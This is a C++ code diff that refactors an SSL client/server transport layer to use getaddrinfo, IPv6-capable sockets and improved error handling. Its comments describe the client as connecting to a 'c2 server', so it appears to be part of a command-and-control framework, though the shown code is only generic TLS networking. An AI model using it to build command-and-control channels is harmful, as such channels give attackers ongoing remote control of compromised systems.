@@ -252,18 +252,22 @@ int ssl_stream::init(int type) {
 
     // initialise connection based on whether we are the client or server
     if (type == TPT_CLIENT) {
+
+        // if client, connect to c2 server
         return this->connect(g_host, g_port);
+
     } else if (type == TPT_SERVER) {
-        if (this->bind(g_port)) {
+
+        // if server, bind to desired port and accept client connection
+        if (this->bind(g_port) == 0) {
             return this->accept();
         } 
-        return -1;
+
     } else {
         LOG("error: invalid transport type\n");
-        return -1;
     }
 
-    return 0;
+    return -1;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -313,33 +317,59 @@ int ssl_stream::recv(message & msg) {
 ////////////////////////////////////////////////////////////////////////////////
 // transport client implementation to connect with c2 server over SSL
 
-int ssl_stream::connect(std::string hostname, int port) {
-    struct sockaddr_in addr;
-    struct hostent *host;
+int ssl_stream::connect(std::string host, int port) {
+    struct addrinfo hints, *server, *index;
+    char addr_str[INET6_ADDRSTRLEN];
+    int ai_result;
+    int err;
 
-    // resolve hostname
-    if ((host = gethostbyname(hostname.c_str())) == NULL) {
-        LOG("error: failed resolving hostname\n");
-        return -1;
+    // configure hints for tcp connection
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+
+    // obtain address info for server
+    char _port[32];
+    snprintf(_port, sizeof(_port), "%d", port);
+    if ((ai_result = getaddrinfo(host.c_str(), _port, &hints, &server)) != 0) {
+        LOG("error: %s\n", gai_strerror(ai_result));
+        return ai_result;
     }
 
-    // create tcp socket and connect to server
-    m_sock = socket(PF_INET, SOCK_STREAM, 0);
-    if (m_sock < 0) {
-        LOG("error: ssl failed to create tcp socket\n");
-        return -1;
+    // loop through results, connect to first possible
+    for (index = server; index != NULL; index = index->ai_next) {
+
+        // try to open a tcp socket for this result
+        if ((m_sock = socket(index->ai_family,
+                             index->ai_socktype,
+                             index->ai_protocol)) == -1) {
+            LOG("error: (socket) %s\n", strerror(errno));
+            continue;
+        } 
+
+        // connect to server using new socket
+        if ((err = ::connect(m_sock,
+                             index->ai_addr,
+                             index->ai_addrlen)) == -1) {
+            LOG("error: (connect) %s\n", strerror(errno));
+            this->close();
+            continue;
+        }
+
+        // obtain presentable address of server
+        inet_ntop(index->ai_family,
+                  get_in_addr((struct sockaddr*)index->ai_addr),
+                  addr_str,
+                  sizeof(addr_str));
+
+        // success!
+        d_ip = host;
+        d_port = port;
+        break;
     }
 
-    // establish tcp connection
-    bzero(&addr, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port);
-    addr.sin_addr.s_addr = *(long*)(host->h_addr);
-    if (::connect(m_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
-        this->close();
-        perror("error");
-        return -1;
-    }
+    // clean up address info
+    freeaddrinfo(server);
 
     // create ssl session
     ssl = SSL_new(ctx);
@@ -367,42 +397,81 @@ int ssl_stream::connect(std::string hostname, int port) {
 // transport server implementation to bind/listen on c2 server port
 
 int ssl_stream::bind(int port) {
-    struct sockaddr_in addr;
+    struct addrinfo hints, *ai, *index;
+    int ai_result;
+    
+    // configure hints for tcp connection
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_family = AF_INET;
+    hints.ai_flags = AI_PASSIVE;
 
-    // create and configure tcp socket
-    m_sock = socket(PF_INET, SOCK_STREAM, 0);
-    bzero(&addr, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(port);
-    addr.sin_addr.s_addr = INADDR_ANY;
-
-    // bind socket to desired server port
-    if (::bind(m_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
-        LOG("error: ssl can't bind to port\n");
-        return -1;
+    // obtain address info for server port
+    char _port[32] = {0};
+    snprintf(_port, sizeof(_port), "%d", port);
+    if ((ai_result = getaddrinfo(NULL, _port, &hints, &ai)) != 0) {
+        LOG("error:: %s\n", gai_strerror(ai_result));
+        return ai_result;
     }
 
-    // start listening for client connections
-    if (::listen(m_sock, 10) != 0) {
-        LOG("error: ssl can't configure listening port\n");
-        return -1;
-    }
+    // loop through results and bind to first possible
+    for (index = ai; index != NULL; index = index->ai_next) {
 
-    return m_sock;
+        // attempt to open socket
+        if ((m_sock = socket(index->ai_family,
+                             index->ai_socktype,
+                             index->ai_protocol)) == -1) {
+            LOG("error: (socket) %s\n", strerror(errno));
+            continue;
+        } 
+
+        // avoid "address already in use" errors
+        int optval = 1;
+        setsockopt(m_sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));
+
+        // bind socket to server port
+        if (::bind(m_sock, index->ai_addr, index->ai_addrlen) == -1) {
+            LOG("error: (bind) %s\n", strerror(errno));
+            continue;
+        } 
+
+        // start listening for connections
+        if (::listen(m_sock, SOCKET_BACKLOG) == -1) {
+            LOG("error: (listen) %s\n", strerror(errno));
+            this->close();
+            continue;
+        } 
+
+        // success!
+        s_port = port;
+        break;
+    }
+    
+    freeaddrinfo(ai);
+    return index == NULL ? -1 : m_sock;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 // transport server implementation to accept client SSL connection 
 
 int ssl_stream::accept() {
-    struct sockaddr_in addr;
-    socklen_t len = sizeof(addr);
+    struct sockaddr_storage client;
+    socklen_t len = sizeof(client);
+    char client_ip[INET6_ADDRSTRLEN];
 
     // wait for client to connect
     // NOTE: here we clobber the server's listening socket stored in m_sock
-    m_sock = ::accept(m_sock, (struct sockaddr*)&addr, &len);
-    LOG("info: connection established %s:%d\n", 
-        inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
+    m_sock = ::accept(m_sock, (struct sockaddr*)&client, &len);
+    if (m_sock <= 0) {
+      LOG("error: (accept) %s\n", strerror(errno));
+      return -1;
+    }
+
+    // request connected client information
+    inet_ntop(client.ss_family,
+              get_in_addr((struct sockaddr*)&client),
+              client_ip, 
+              INET6_ADDRSTRLEN);
 
     // pass client socket to openssl and accept the connection 
     ssl = SSL_new(ctx);
@@ -411,6 +480,10 @@ int ssl_stream::accept() {
         LOG("error: ssl accept failed\n");
         return -1;
     }
+
+    d_ip = client_ip;
+    d_port = ntohs(((struct sockaddr_in*)&client)->sin_port); 
+    LOG("info: connection established %s:%d\n", d_ip.c_str(), d_port); 
 
     // log ssl connection info / make socket non-blocking
     LOG("info: SSL connected using cipher (%s)\n", SSL_get_cipher(ssl)); 
